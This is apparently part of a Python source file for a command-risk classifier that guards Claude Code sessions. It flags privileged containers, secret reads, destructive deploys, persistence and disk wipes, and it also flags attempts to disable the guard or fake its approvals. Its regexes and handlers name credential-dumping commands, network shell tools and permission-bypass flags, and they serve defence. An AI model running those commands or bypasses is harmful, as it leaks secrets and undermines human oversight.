            ctx.add("risky", f"`{program} exec --privileged` gives the command full control of the machine.")
        if len(p) > 1:
            remote(arg(" ".join(shquote(x) for x in p[1:]), joined_marks(p[1:])), ctx, f"in the container "
                                                                                       f"{p[0]}")
        else:
            ctx.add("exec", f"Runs `{program} exec`.")
    elif sub in ("system", "volume", "image", "container", "network", "builder", "buildx") and \
            any(r in ("prune", "rm", "remove") for r in rest):
        if sub in ("system", "volume") and (sub == "volume" or "--volumes" in rest):
            ctx.add("discard", f"`{program} {sub} {' '.join(rest)}` deletes stored data (volumes) for good.")
        else:
            ctx.add("exec", f"Removes unused {program} {sub}s.")
    elif sub in ("ps", "images", "logs", "inspect", "version", "info", "top", "stats", "history", "port",
                 "diff",
                 "search", "events", "--version"):
        ctx.add("read", f"Only shows information ({program} {sub}).")
    elif sub == "login" and any(r in ("-p", "--password") or r.startswith("--password=") for r in rest):
        ctx.add("egress-risk", f"Puts a password in the {program} login command; use --password-stdin.")
    elif sub in ("build",):
        return project_run(ctx, f"Builds an image with {program} in the project.")
    else:
        ctx.add("exec", f"Runs `{program} {sub}`.")
    return Stage()


DOCKER_RUN_ARGS = {"-v", "--volume", "-e", "--env", "-p", "--publish", "-w", "--workdir", "-u", "--user",
                   "--name",
                   "--network", "--net", "--mount", "--entrypoint", "-h", "--hostname", "--env-file", "-l",
                   "--label", "--platform", "--gpus", "--cpus", "-m", "--memory", "--restart", "--add-host",
                   "--device", "--cap-add", "--cap-drop", "--security-opt", "--ulimit", "--volumes-from",
                   "--dns",
                   "--link", "--log-driver", "--log-opt", "--pid", "--ipc", "--runtime", "--shm-size",
                   "--tmpfs",
                   "--userns", "--uts", "--cidfile", "--pull", "-a", "--attach", "--expose", "--health-cmd",
                   "--stop-signal", "--stop-timeout", "--memory-swap", "--cgroupns", "--group-add",
                   "--sysctl",
                   "--storage-opt", "--cpuset-cpus", "--domainname", "--mac-address", "--ip"}


def docker_run(rest: list[Arg], ctx: Ctx) -> None:
    opts, pos = options(rest, DOCKER_RUN_ARGS, first_stops=True)
    risky = ["--privileged"] if has(opts, "--privileged") else []
    for name, value in opts:
        v = str(value or "")
        if name in ("--pid", "--net", "--network", "--ipc", "--uts", "--userns") and v == "host":
            risky.append(f"{name}=host")
        if name == "--cap-add" and v.upper() in ("ALL", "SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "NET_ADMIN"):
            risky.append(f"--cap-add={v}")
        if name == "--security-opt" and "unconfined" in v:
            risky.append(f"--security-opt {v}")
        if name == "--device":
            risky.append(f"--device {v}")
    mounts = [m.split(":")[0] for m in values(opts, "-v", "--volume")]
    for m in values(opts, "--mount"):
        src = re.search(r"(?:source|src)=([^,]+)", m)
        if src:
            mounts.append(src.group(1))
    for src in mounts:
        if not src.startswith(("/", "~", ".")):
            continue
        path = ctx.where.resolve(src, ctx.cwd)
        if path is None:
            continue
        place = ctx.where.place(path)
        if path.endswith("docker.sock") or ctx.where.critical(path) or ctx.where.holds(path) or \
                place in ("secret", "persistence", "system", "self"):
            risky.append(f"mounts {ctx.show(path)}")
    if risky:
        ctx.add("risky", f"The container gets access to this computer ({', '.join(risky)}): whatever runs "
                         f"in it "
                         "can read or change your files.")
    if len(pos) > 1:
        remote(arg(" ".join(shquote(x) for x in pos[1:]), joined_marks(pos[1:])), ctx, f"in a {pos[0]} "
                                                                                       f"container")
    else:
        ctx.add("exec", f"Starts a {pos[0] if pos else ''} container.")


def docker_compose(program, rest, ctx):
    opts, pos = options(rest, {"-f", "--file", "-p", "--project-name", "--profile", "--env-file"},
                        first_stops=True)
    sub = pos[0] if pos else ""
    if sub == "down" and any(r in ("-v", "--volumes") for r in pos):
        ctx.add("discard", "`compose down -v` deletes the services' stored data (volumes).")
    elif sub in ("exec", "run") and len(pos) > 1:
        o, p = options(pos[1:], {"-e", "--env", "-u", "--user", "-w", "--workdir", "--entrypoint", "-v",
                                 "--volume",
                                 "-p", "--publish", "--name", "-l", "--label"}, first_stops=True)
        if len(p) > 1:
            remote(arg(" ".join(shquote(x) for x in p[1:]), joined_marks(p[1:])), ctx, f"in the {p[0]} "
                                                                                       f"service")
        else:
            ctx.add("exec", f"Starts the {p[0] if p else ''} service.")
    elif sub in ("ps", "logs", "config", "images", "top", "ls", "version"):
        ctx.add("read", f"Only shows information (compose {sub}).")
    else:
        ctx.add("exec", f"Runs `compose {sub}`.")
    return Stage()


KUBECTL_ARGS = {"-n", "--namespace", "-o", "--output", "-l", "--selector", "-c", "--container", "--context",
                "--kubeconfig", "-f", "--filename", "--field-selector", "--replicas", "--type", "-p",
                "--patch",
                "--image", "--sort-by", "--timeout", "--grace-period", "--tail", "--since"}


def h_kubectl(argv, ctx, stdin):
    program = argv[0]
    head = argv[1:argv.index("--")] if "--" in argv else argv[1:]
    opts, pos = options(head, KUBECTL_ARGS)
    sub = pos[0] if pos else ""
    kind = pos[1].lower() if len(pos) > 1 else ""
    if sub == "exec":
        inner = argv[argv.index("--") + 1:] if "--" in argv else pos[2:]
        if inner:
            remote(arg(" ".join(shquote(x) for x in inner), joined_marks(inner)), ctx, f"in the pod {kind}")
        else:
            ctx.add("exec", "Opens a shell in a pod.")
    elif sub in ("delete", "drain", "replace") or (sub == "scale" and "0" in [str(v) for v in
                                                                               values(opts, "--replicas")]) \
            or (sub == "rollout" and kind == "undo"):
        ctx.add("remote-irreversible", f"`{program} {sub}` removes or replaces things running in the "
                                       f"cluster.")
    elif sub in ("get", "describe") and kind.startswith("secret") and (sub == "describe" or
                                                                       values(opts, "-o", "--output")):
        ctx.add("secret-read", "Prints Kubernetes secrets into the conversation.")
    elif sub == "config" and kind == "view" and has(opts, "--raw", "--flatten"):
        ctx.add("secret-read", "Prints the cluster login keys into the conversation.")
    elif sub in ("get", "describe", "logs", "top", "explain", "version", "api-resources", "api-versions",
                 "cluster-info", "config", "events", "auth", "diff"):
        ctx.add("read", f"Only shows information ({program} {sub}).")
    else:
        ctx.add("exec", f"Changes the cluster (`{program} {sub}`).")
    return Stage()


def h_helm(argv, ctx, stdin):
    pos = [a for a in argv[1:] if not a.startswith("-")]
    sub = pos[0] if pos else ""
    if sub in ("uninstall", "delete", "del", "un", "rollback", "push"):
        ctx.add("remote-irreversible", f"`helm {sub}` removes, rolls back or publishes a release.")
    elif sub in ("list", "ls", "status", "history", "show", "search", "template", "lint", "version", "env",
                 "repo",
                 "dependency"):
        ctx.add("read", f"Only shows information (helm {sub}).")
    else:
        ctx.add("exec", f"Changes the cluster (`helm {sub}`).")
    return Stage()


DEPLOY_WORDS = {
    "pulumi": {"up", "update", "destroy", "refresh", "import", "cancel"}, "cdk": {"deploy", "destroy"},
    "cdktf": {"deploy", "destroy"}, "serverless": {"deploy", "remove"}, "sls": {"deploy", "remove"},
    "firebase": {"deploy"}, "vercel": {"remove", "rm", "promote", "rollback"}, "fly": {"deploy", "destroy"},
    "flyctl": {"deploy", "destroy"}, "wrangler": {"deploy", "publish", "delete", "rollback"},
    "railway": {"up", "down", "delete"}, "eb": {"deploy", "terminate"}, "copilot": {"deploy"},
    "sam": {"deploy", "delete"}, "amplify": {"publish"}, "kamal": {"deploy", "remove", "rollback"},
}
CLOUD_SECRETS = {
    "aws": r"get-secret-value|ssm get-parameters?\b.*--with-decryption|export-credentials|get-session-token|"
           r"configure get \S*(secret|token)|ecr get-login-password",
    "gcloud": r"print-access-token|print-identity-token|secrets versions access",
    "az": r"get-access-token|keyvault secret show|keys list|credential list",
    "heroku": r"^config(\s|$)(?!:set)|auth:token",
    "doctl": r"auth token",
}


def h_cloud(argv, ctx, stdin):
    program = argv[0]
    pos = [a for a in argv[1:] if not a.startswith("-")]
    joined = " ".join(argv[1:]).lower()
    words = {p.lower() for p in pos}
    sub = pos[0].lower() if pos else ""
    pattern = CLOUD_SECRETS.get(program)
    if pattern and re.search(pattern, joined):
        ctx.add("secret-read", f"Prints a cloud secret or login token into the conversation ({program}).")
        return Stage()
    destructive = bool(words & DEPLOY_WORDS.get(program, set()))
    if program == "aws":
        destructive = destructive or any(re.match(r"^(delete|terminate|remove|deregister|purge|destroy|"
                                                  r"revoke|"
                                                  r"disable)-", w) for w in words) or \
            (sub == "s3" and bool(words & {"rm", "rb", "mv"} or ("sync" in words and "--delete" in argv)))
        if sub == "s3" and words & {"cp", "sync"} and pos[-1:] and pos[-1].startswith("s3://"):
            egress_payload(ctx, program, [], [p for p in pos[2:-1] if not p.startswith("s3://")],
                           [pos[-1]], stdin,
                           True)
    elif program in ("gcloud", "az", "doctl"):
        destructive = destructive or bool(words & {"delete", "rm", "destroy", "purge"}) or \
            (program == "gcloud" and "deploy" in words)
    elif program == "heroku":
        destructive = bool(re.search(r"apps:destroy|pg:reset|releases:rollback|apps:delete|addons:destroy|"
                                     r"ps:scale \S+=0", joined))
    elif program == "vercel":
        destructive = destructive or "--prod" in argv or "--production" in argv
    elif program == "netlify":
        destructive = "deploy" in words and ("--prod" in argv or "-p" in argv)
    elif program == "supabase":
        destructive = bool(re.search(r"db (reset|push)|projects delete|functions delete", joined))
    elif program == "ansible-playbook":
        destructive = True
    elif program in ("render", "dokku"):
        destructive = bool(words & {"delete", "destroy", "deploy", "apps:destroy"})
    if program == "gcloud" and pos[:2] == ["builds", "submit"] and \
            any(a.split("=", 1)[0] in ("--tag", "-t", "--config", "--pack") for a in argv[1:]):
        ctx.add("remote-irreversible", "`gcloud builds submit` uploads the source, builds it in the cloud "
                                       "and publishes the image to a registry (like `docker push`).")
        return Stage()
    if destructive:
        ctx.add("remote-irreversible", f"`{program} {' '.join(pos[:3])}` deploys, deletes or changes real "
                                       "infrastructure.")
    elif {sub, pos[1].lower() if len(pos) > 1 else ""} & {"ls", "list", "describe", "get", "show", "status",
                                                          "logs", "whoami", "version", "help", "info"} \
            or re.search(r"\b(describe|list|get|show)-", joined) or "--version" in argv:
        ctx.add("read", f"Only shows information ({program} {sub}).")
    else:
        ctx.add("exec", f"Runs `{program} {' '.join(pos[:2])}`.")
    return Stage()


def h_db_client(argv, ctx, stdin):
    program = argv[0]
    joined = " ".join(argv[1:])
    if program in ("dropdb", "dropuser"):
        ctx.add("remote-irreversible", f"`{program}` deletes a database or a user.")
        return Stage()
    if program == "redis-cli" and re.search(r"(?i)\b(flushall|flushdb)\b", joined):
        ctx.add("remote-irreversible", "Deletes every key in the Redis database.")
        return Stage()
    texts = [joined] + ([stdin.text] if stdin is not None and stdin.text else [])
    if any(SQL_DESTRUCTIVE.search(t) for t in texts):
        ctx.add("remote-irreversible", f"Runs SQL that deletes data (DROP, TRUNCATE or DELETE without "
                                       f"WHERE) with "
                                       f"{program}.")
        return Stage()
    if program in ("mysql", "mariadb", "mysqldump") and re.search(r"(?:^|\s)(?:-p\S+|--password=\S+)",
                                                                  joined):
        ctx.add("egress-risk", "Puts a database password in the command.")
    ctx.add("exec", f"Runs the database client {program}.")
    return Stage()


DB_RESET = re.compile(r"prisma migrate reset|prisma db push .*--force-reset|db:(?:drop|reset|purge|wipe)|"
                      r"manage\.py (?:flush|reset_db|sqlflush)|migrate:(?:fresh|reset|refresh)|artisan "
                      r"db:wipe")


def h_db_reset(argv, ctx, stdin=None):
    if DB_RESET.search(" ".join(argv).lower()):
        ctx.add("remote-irreversible", "Resets or deletes the database and its data.")
        return Stage()
    return None


def h_db_tool(argv, ctx, stdin):
    if h_db_reset(argv, ctx) is not None:
        return Stage()
    if argv[0] in RUNNERS or argv[0] == "rake" and any(a in ("test", "spec", "lint") for a in argv[1:]):
        return project_run(ctx, f"Runs {argv[0]} in the project.")
    return generic(argv, ctx, stdin)


# ---------------------------------------------------------------- secrets, persistence, system


def h_secret_cli(argv, ctx, stdin):
    program = argv[0]
    pos = [a for a in argv[1:] if not a.startswith("-")]
    joined = " ".join(argv[1:])
    if program == "op" and (pos[:1] in (["read"], ["inject"]) or "item get" in joined):
        ctx.add("secret-read", "Reads a password from 1Password into the conversation.")
    elif program in ("pass", "gopass") and (not pos or pos[0] in ("show", "cat") or len(pos) == 1):
        ctx.add("secret-read", f"Shows a stored password ({program}).")
    elif program == "vault" and re.search(r"\b(?:kv delete|kv destroy|kv metadata delete|delete)\b", joined):
        ctx.add("remote-irreversible", "Deletes secrets in Vault.")
    elif program == "vault" and re.search(r"\b(?:read|kv get)\b", joined):
        ctx.add("secret-read", "Reads secrets from Vault into the conversation.")
    elif program == "security" and re.search(r"find-(?:generic|internet)-password.*-[wg]\b|dump-keychain|"
                                             r"\bexport\b", joined):
        ctx.add("secret-read", "Reads a password from the macOS keychain into the conversation.")
    elif program == "secret-tool" and pos[:1] == ["lookup"]:
        ctx.add("secret-read", "Reads a password from the keyring into the conversation.")
    elif program in ("gpg", "gpg2") and re.search(r"--export-secret", joined):
        ctx.add("secret-read", "Exports your private key.")
    elif program == "doppler" and pos[:1] == ["secrets"]:
        ctx.add("secret-read", "Reads secrets from Doppler into the conversation.")
    else:
        ctx.add("exec", f"Runs {program}.")
    return Stage()


def h_crontab(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-u"})
    if has(opts, "-l"):
        ctx.add("read", "Lists scheduled jobs.")
    else:
        ctx.add("persistence", "Changes your scheduled jobs (cron), which run commands later on their own.")
    return Stage()


def h_launchctl(argv, ctx, stdin):
    sub = argv[1] if len(argv) > 1 else ""
    if sub in ("load", "bootstrap", "submit", "enable", "setenv", "kickstart"):
        ctx.add("persistence", f"`launchctl {sub}` sets up a program that runs on its own (at login or "
                               f"always).")
    elif sub in ("list", "print", "print-disabled", "blame", "getenv", "version", "help", "managerpid"):
        ctx.add("read", "Lists background services.")
    else:
        ctx.add("risky", f"`launchctl {sub}` changes background services.")
    return Stage()


def h_systemctl(argv, ctx, stdin):
    pos = [a for a in argv[1:] if not a.startswith("-")]
    sub = pos[0] if pos else ""
    if sub in ("enable", "link", "edit", "set-environment", "preset", "add-wants", "add-requires",
               "import-environment", "revert", "set-property"):
        ctx.add("persistence", f"`systemctl {sub}` sets up a service that runs on its own.")
    elif sub in ("status", "list-units", "list-unit-files", "list-timers", "show", "cat", "is-active",
                 "is-enabled",
                 "is-failed", "list-dependencies", "list-sockets", "list-jobs", "help", ""):
        ctx.add("read", "Only shows service information.")
    else:
        ctx.add("risky", f"`systemctl {sub}` starts, stops or changes system services (or the computer "
                         f"itself).")
    return Stage()


def h_windows_persist(argv, ctx, stdin):
    program = argv[0]
    joined = " ".join(argv[1:]).lower()
    if re.search(r"/query|\bquery\b", joined) and program in ("schtasks", "reg"):
        ctx.add("read", "Only shows information.")
    elif (program == "schtasks" and "/create" in joined) or (program == "at" and len(argv) > 1):
        ctx.add("persistence", "Schedules a program to run later on its own.")
    elif program == "reg" and re.search(r"\b(?:add|import|copy|load|restore)\b", joined):
        if re.search(r"\\run|runonce|winlogon|\\services|image file execution", joined):
            ctx.add("persistence", "Makes Windows start a program on its own (registry Run keys or "
                                   "services).")
        else:
            ctx.add("risky", "Changes the Windows registry.")
    else:
        ctx.add("risky", f"Runs {program}, which changes Windows settings.")
    return Stage()


def h_disk(argv, ctx, stdin):
    program = argv[0]
    joined = " ".join(argv[1:])
    if program == "diskutil" and not re.search(r"(?i)erase|partition|zero|random|secure|reformat|apfs delete",
                                               joined):
        ctx.add("read", "Shows disk information.")
        return Stage()
    if program in ("fdisk", "sfdisk", "gdisk", "parted") and any(a in ("-l", "--list",
                                                                       "print") for a in argv[1:]):
        ctx.add("read", "Lists disk partitions.")
        return Stage()
    ctx.add("system", f"`{program}` formats or repartitions a disk: everything on it is lost.")
    return Stage()


def h_power(argv, ctx, stdin):
    if argv[0] == "init" and not any(a in ("0", "6", "1", "s", "S") for a in argv[1:]):
        ctx.add("exec", "Runs init.")
    else:
        ctx.add("risky", f"`{argv[0]}` shuts down or restarts the computer.")
    return Stage()


def h_kill(argv, ctx, stdin):
    if "-1" in argv[2:] or argv[-1:] == ["-1"] and len(argv) > 2 or (len(argv) == 2 and argv[1] == "-1"):
        ctx.add("risky", "Stops every process you own, including your desktop session.")
    else:
        ctx.add("exec", f"Stops processes ({argv[0]}).")
    return Stage()


FIREWALLS = {"iptables", "ip6tables", "nft", "ufw", "firewall-cmd", "pfctl"}


def h_system_admin(argv, ctx, stdin):
    program = argv[0]
    joined = " ".join(argv[1:])
    if program in FIREWALLS and re.search(r"(?:^|\s)(?:-L|--list|status|list|-sr)\b", joined) and \
            not re.search(r"(?:^|\s)-(?:F|X|D|A|I|P|R|Z)\b|disable|delete|--remove|flush|\s-d\b", joined):
        ctx.add("read", "Only shows firewall rules.")
    elif program == "sysctl" and not re.search(r"(?:^|\s)-w\b|=", joined):
        ctx.add("read", "Only shows kernel settings.")
    elif program in ("mount", "umount") and not argv[1:]:
        ctx.add("read", "Lists mounted disks.")
    elif program == "hostname":
        if len(argv) > 1 and not argv[1].startswith("-"):
            ctx.add("risky", "Changes the computer's name.")
        else:
            ctx.add("read", "Shows the computer's name.")
    elif program == "date":
        if re.search(r"(?:^|\s)(?:-s|--set)\b", joined):
            ctx.add("risky", "Changes the system clock.")
        else:
            ctx.add("read", "Shows the date.")
    elif program == "csrutil" and re.search(r"\bstatus\b", joined):
        ctx.add("read", "Shows system protection status.")
    else:
        ctx.add("risky", f"`{program}` changes system security or accounts (firewall, users, protections).")
    return Stage()


def h_claude(argv, ctx, stdin):
    joined = " ".join(argv[1:])
    pos = [a for a in argv[1:] if not a.startswith("-")]
    if re.search(r"--dangerously-skip-permissions|bypassPermissions|--allow-dangerously", joined):
        ctx.add("risky", "Starts another Claude with every permission check turned off.")
    if pos[:1] in (["plugin"], ["plugins"]) and len(pos) > 1:
        action = pos[1]
        if action in ("disable", "uninstall", "remove",
                      "rm") and any(n in p for p in pos[2:] for n in ("haris", "mizan", "nexika")):
            ctx.add("self", "Turns off or removes haris or a plugin it guards (mizan). You can do that "
                            "yourself if you want it.")
        elif action == "marketplace" and len(pos) > 2 and pos[2] in ("remove", "rm") and \
                any("nexika" in p for p in pos[3:]):
            ctx.add("self", "Removes the marketplace haris comes from. You can do that yourself if you "
                            "want it.")
        elif action in ("validate", "list", "help"):
            ctx.add("read", "Only shows plugin information.")
        else:
            ctx.add("config-exec", f"Changes installed Claude Code plugins (`claude plugin {action}`).")
        return Stage()
    if pos[:1] == ["mcp"] and len(pos) > 1:
        if pos[1] in ("list", "get"):
            ctx.add("read", "Lists MCP servers.")
        else:
            ctx.add("config-exec", f"Changes which MCP servers Claude Code runs (`claude mcp {pos[1]}`).")
        return Stage()
    if pos[:1] == ["config"] and len(pos) > 1 and pos[1] in ("set", "add", "remove"):
        ctx.add("persistence", "Changes Claude Code's settings.")
        return Stage()
    if any(a in ("--version", "-v", "--help", "-h") for a in argv[1:]) or pos[:1] == ["doctor"]:
        ctx.add("read", "Only shows Claude Code information.")
        return Stage()
    ctx.add("exec", "Starts another Claude Code session.")
    return Stage()


def installed_helper(path: str, ctx: Ctx) -> bool:
    """The haris that guards this session (or any copy under ~/.claude), not a source checkout."""
    if path.startswith(PLUGIN_ROOT + "/"):
        return not ctx.where.develops(PLUGIN_ROOT)
    return not ctx.where.develops(path)


def hook_data(ctx: Ctx) -> str | None:
    """Where a haris hook run by this command keeps its approvals; None when only known when it runs."""
    env = {**ctx.vars, **ctx.prefix}
    if "HARIS_HOME" in env:
        value = env["HARIS_HOME"]
    elif "HOME" in env:
        value = env["HOME"] + "/.claude/nexika/haris"
    else:
        return None if ctx.vars_lost else data_home()
    return None if UNKNOWN in value or not value else ctx.where.resolve(value, ctx.cwd)


def own_helper(argv: list[Arg], ctx: Ctx, installed: bool = True) -> Stage:
    """The haris helper: reading commands are fine; playing a hook by hand is not. A source checkout's
    hook is fine when it keeps its approvals away from the haris guarding this session."""
    words = [a for a in argv[1:] if not a.startswith("-")]
    data = None if installed or "hook" not in words else hook_data(ctx)
    if "hook" in words and not installed and data is None:
        ctx.add("unknown-target", "Runs a haris hook from a source checkout by hand; where it keeps its "
                                  "approvals is only known when it runs, so it could be the haris guarding "
                                  "you.")
    elif "hook" in words and (installed or data == data_home() or data.startswith(data_home() + "/")):
        ctx.add("self", "Runs haris's hook by hand, which could fake your approval. Only Claude Code runs "
                        "hooks.")
    elif "hook" in words:
        ctx.add("exec", "Runs a haris hook from a source checkout, with its own data folder.")
    elif words[:1] and words[0] in ("why", "status", "audit", "check", "export", "approvals", "version",
                                    "help"):
        ctx.add("read", f"Shows haris information (haris {words[0]}).")
    else:
        ctx.add("exec", "Runs the haris helper.")
    return Stage()


def h_haris(argv, ctx, stdin):
    return own_helper(argv, ctx)


# Any copy's helper: a checkout's `haris hook` writes the same approvals as the installed one.
HARIS_HELPER = re.compile(r"/haris(?:/[\w.+-]+)?/bin/haris$")
MIZAN_HELPER = re.compile(r"/mizan(?:/[\w.+-]+)?/bin/mizan$")  # a checkout, or the cache's mizan/<version>


def mizan_helper(argv: list[Arg], ctx: Ctx) -> Stage:
    """The mizan helper: reports are fine; playing its hooks or publishing its status by hand is not."""
    words = [a for a in argv[1:] if not a.startswith("-")]
    publishes = any(len(a) >= 4 and "--publish".startswith(a) for a in argv[1:])  # --pub, --publ ...
    if words[:1] in (["hook"], ["statusline"]) or publishes:
        ctx.add("self", "Runs mizan's hook or publishes its status by hand, which could fake what mizan "
                        "shows you. Only Claude Code and the mizan display run these.")
    elif words[:1] and words[0] in ("status", "report", "export", "proof"):
        ctx.add("read", f"Shows mizan information (mizan {words[0]}).")
    else:
        ctx.add("exec", "Runs the mizan helper.")
    return Stage()


def h_open(argv, ctx, stdin):
    ctx.add("exec", f"Opens something with {argv[0]}.")
    return Stage()


def h_history(argv, ctx, stdin):
    if any(a in ("-c", "-w", "-d") for a in argv[1:]):
        ctx.add("risky", "Clears or rewrites the shell history.")
    else:
        ctx.add("read", "Shows the shell history.")
    return Stage()


def h_ssh_keygen(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-f", "-t", "-b", "-C", "-N", "-P", "-I", "-n", "-V", "-z", "-O", "-Y",
                                   "-s",
                                   "-E", "-m", "-a", "-Z", "-F", "-R"})
    files = values(opts, "-f")
    if has(opts, "-y", "-l", "-F", "-L", "-Q", "-B"):
        ctx.add("read", "Shows key information.")
    elif files:
        write_paths(files, ctx, "creates a key at")
    else:
        ctx.add("exec", "Creates a key.")
    return Stage()


HANDLERS = {
    "cd": h_cd, "pushd": h_cd, "popd": h_cd, "export": h_export, "declare": h_export, "typeset": h_export,
    "local": h_export, "readonly": h_export, "alias": h_export, "unalias": h_export, "trap": h_trap,
    "set": h_set, "shift": h_set, "coproc": h_coproc,
    "eval": h_eval, "source": h_source, ".": h_source,
    "env": h_env, "sudo": h_sudo, "doas": h_sudo, "pkexec": h_sudo, "run0": h_sudo, "su": h_su,
    "watch": h_watch, "flock": h_flock, "chroot": h_chroot, "nsenter": h_chroot, "xargs": h_xargs,
    "find": h_find, "gfind": h_find, "rm": h_rm, "rmdir": h_rm, "unlink": h_rm, "srm": h_rm, "trash": h_rm,
    "trash-put": h_rm, "rimraf": h_rm, "del-cli": h_rm, "del": h_rm, "shx": h_shx,
    "shred": h_shred, "mv": h_mv, "cp": h_mv, "ln": h_ln, "touch": h_touch, "tee": h_tee,
    "install": h_install, "chmod": h_chmod, "chown": h_chmod, "chgrp": h_chmod, "chattr": h_chmod,
    "setfacl": h_chmod, "xattr": h_chmod, "sed": h_sed, "gsed": h_sed, "awk": h_awk, "gawk": h_awk,
    "mawk": h_awk, "nawk": h_awk, "dd": h_dd, "truncate": h_truncate, "tar": h_tar, "gtar": h_tar,
    "bsdtar": h_tar, "zip": h_zip, "unzip": h_zip, "gzip": h_compress, "gunzip": h_compress,
    "bzip2": h_compress, "bunzip2": h_compress, "xz": h_compress, "unxz": h_compress, "zstd": h_compress,
    "patch": h_patch, "mkdir": h_mkdir, "mkfifo": h_mkdir,
    "vim": h_editor, "vi": h_editor, "nvim": h_editor, "nano": h_editor, "emacs": h_editor, "code": h_editor,
    "subl": h_editor, "python": h_python, "python3": h_python, "pypy3": h_python, "node": h_node,
    "nodejs": h_node, "bun": h_node, "ruby": h_script_lang, "perl": h_script_lang, "php": h_script_lang,
    "lua": h_script_lang, "rscript": h_script_lang, "osascript": h_script_lang, "tclsh": h_script_lang,
    "pwsh": h_powershell, "powershell": h_powershell, "curl": h_curl, "wget": h_wget, "http": h_httpie,
    "https": h_httpie, "xh": h_httpie, "nc": h_netcat, "ncat": h_netcat, "netcat": h_netcat,
    "socat": h_netcat,
    "telnet": h_netcat, "ssh": h_ssh, "scp": h_scp, "rsync": h_scp, "sftp": h_scp, "mail": h_mail,
    "mailx": h_mail, "sendmail": h_mail, "mutt": h_mail, "git": h_git, "gh": h_gh, "glab": h_gh,
    "docker": h_docker, "podman": h_docker, "nerdctl": h_docker, "docker-compose": h_docker,
    "kubectl": h_kubectl, "oc": h_kubectl, "helm": h_helm, "make": h_make, "gmake": h_make, "just": h_make,
    "task": h_make, "npm": h_node_pm, "pnpm": h_node_pm, "yarn": h_node_pm, "npx": npx, "pnpx": npx,
    "bunx": npx, "uvx": npx, "pip": h_pip, "pip3": h_pip, "uv": h_runner_wrapper, "poetry": h_runner_wrapper,
    "pipenv": h_runner_wrapper, "pdm": h_runner_wrapper, "hatch": h_runner_wrapper, "rye": h_runner_wrapper,
    "bundle": h_runner_wrapper, "conda": h_runner_wrapper, "mamba": h_runner_wrapper,
    "pixi": h_runner_wrapper,
    "twine": h_runner_wrapper, "flit": h_runner_wrapper, "gem": h_runner_wrapper, "pipx": h_runner_wrapper,
    "cargo": h_build_tool, "go": h_build_tool, "dotnet": h_build_tool, "mvn": h_build_tool,
    "mvnw": h_build_tool,
    "gradle": h_build_tool, "gradlew": h_build_tool, "swift": h_build_tool, "zig": h_build_tool,
    "deno": h_build_tool, "flutter": h_build_tool, "dart": h_build_tool, "bazel": h_build_tool,
    "bazelisk": h_build_tool, "cmake": h_build_tool, "mix": h_build_tool, "meson": h_build_tool,
    "sbt": h_build_tool, "lein": h_build_tool, "stack": h_build_tool, "cabal": h_build_tool,
    "terraform": h_terraform, "tofu": h_terraform, "terragrunt": h_terraform,
    "psql": h_db_client, "mysql": h_db_client, "mariadb": h_db_client, "sqlite3": h_db_client,
    "sqlcmd": h_db_client, "mongosh": h_db_client, "mongo": h_db_client, "redis-cli": h_db_client,
    "cockroach": h_db_client, "clickhouse-client": h_db_client, "duckdb": h_db_client, "dropdb": h_db_client,
    "dropuser": h_db_client, "snowsql": h_db_client, "prisma": h_db_tool, "rails": h_db_tool,
    "rake": h_db_tool,
    "artisan": h_db_tool, "manage.py": h_db_tool,
    "pass": h_secret_cli, "gopass": h_secret_cli, "vault": h_secret_cli, "security": h_secret_cli,
    "secret-tool": h_secret_cli, "gpg": h_secret_cli, "gpg2": h_secret_cli, "crontab": h_crontab,
    "launchctl": h_launchctl, "systemctl": h_systemctl, "schtasks": h_windows_persist,
    "reg": h_windows_persist,
    "at": h_windows_persist, "mkfs": h_disk, "mke2fs": h_disk, "mkswap": h_disk, "fdisk": h_disk,
    "sfdisk": h_disk,
    "gdisk": h_disk, "parted": h_disk, "wipefs": h_disk, "diskutil": h_disk, "blkdiscard": h_disk,
    "format": h_disk, "newfs": h_disk, "shutdown": h_power, "reboot": h_power, "halt": h_power,
    "poweroff": h_power, "init": h_power, "telinit": h_power, "kill": h_kill, "setenforce": h_system_admin,
    "csrutil": h_system_admin, "spctl": h_system_admin, "sysctl": h_system_admin, "passwd": h_system_admin,
    "chpasswd": h_system_admin, "useradd": h_system_admin, "usermod": h_system_admin,
    "userdel": h_system_admin,
    "adduser": h_system_admin, "deluser": h_system_admin, "groupadd": h_system_admin,
    "visudo": h_system_admin,
    "mount": h_system_admin, "umount": h_system_admin, "hostname": h_system_admin, "date": h_system_admin,
    "modprobe": h_system_admin, "insmod": h_system_admin, "rmmod": h_system_admin, "claude": h_claude,
    "haris": h_haris, "open": h_open, "xdg-open": h_open, "start": h_open, "history": h_history,
    "ssh-keygen": h_ssh_keygen, "cross-env": h_cross_env, "cross-env-shell": h_cross_env,
    "op": h_wrapper, "doppler": h_wrapper,
}
for _name in FIREWALLS:
    HANDLERS[_name] = h_system_admin
for _name in WRAPPERS:
    HANDLERS.setdefault(_name, h_wrapper)
for _name in ("pulumi", "cdk", "cdktf", "serverless", "sls", "firebase", "vercel", "netlify", "fly", "flyctl",
              "wrangler", "railway", "supabase", "heroku", "doctl", "gcloud", "az", "aws", "eb", "copilot",
              "sam",
              "amplify", "render", "dokku", "kamal", "ansible-playbook"):
    HANDLERS[_name] = h_cloud
for _name in ("mkfs.ext4", "mkfs.ext3", "mkfs.xfs", "mkfs.vfat", "mkfs.fat", "mkfs.btrfs", "mkfs.ntfs",
              "mkfs.exfat", "newfs_hfs", "newfs_apfs"):
    HANDLERS[_name] = h_disk
for _name in ("sh", "bash", "zsh", "dash", "ksh", "ash", "mksh", "fish"):
    HANDLERS[_name] = h_shell
